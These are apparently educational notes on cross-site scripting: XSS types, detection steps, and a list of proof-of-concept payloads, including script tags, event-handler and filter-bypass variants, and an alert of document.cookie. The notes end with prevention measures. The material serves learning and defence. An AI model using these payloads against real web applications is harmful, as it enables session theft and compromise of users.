# 🔀 Cross-Site Scripting (XSS) — Notes & Labs

![Category](https://img.shields.io/badge/Category-XSS-red?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20→%20Practitioner-orange?style=flat-square)

---

## 🧠 What is XSS?

XSS happens when an attacker injects malicious JavaScript into a web page that gets executed in another user's browser.
The server trusts the input and reflects it back — the victim's browser runs the attacker's script.

---

## 📋 Types of XSS

| Type | How it works |
|------|-------------|
| **Reflected** | Payload in the URL/request — reflected immediately in the response |
| **Stored** | Payload saved in the DB — executes every time the page loads |
| **DOM-based** | JavaScript in the page processes user input unsafely — never hits the server |

---

## 🔍 How to Detect It

**Step 1 — Find reflection points:**
Enter a unique string like `xsstest123` and look for it in the page source.

**Step 2 — Check if it's inside HTML, attribute, or JS context:**
```html
<!-- HTML context -->
<p>xsstest123</p>

<!-- Attribute context -->
<input value="xsstest123">

<!-- JS context -->
var x = 'xsstest123';
```

**Step 3 — Break out of the context and inject:**
```html
<!-- HTML context -->
<script>alert(1)</script>

<!-- Attribute context -->
" onmouseover="alert(1)

<!-- JS context -->
';alert(1)//
```

---

## 💉 Common Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- Attribute escape -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="

<!-- Filter bypass -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Case variation bypass -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

---

## ✅ Key Takeaways

- Always identify the context first (HTML / attribute / JS) before choosing a payload
- `<script>` tags are often filtered — `<img>` and `<svg>` are great alternatives
- DOM XSS never reaches the server — traditional scanners often miss it
- `document.cookie` is the real target — `alert(1)` just proves execution

---

## 🛡️ How to Prevent XSS

| Fix | Description |
|-----|-------------|
| Output Encoding | Encode `<`, `>`, `"`, `'` before rendering |
| Content Security Policy (CSP) | Restrict what scripts can execute |
| HttpOnly Cookies | Prevents JS from reading session cookies |
| Input Validation | Reject unexpected characters at input |
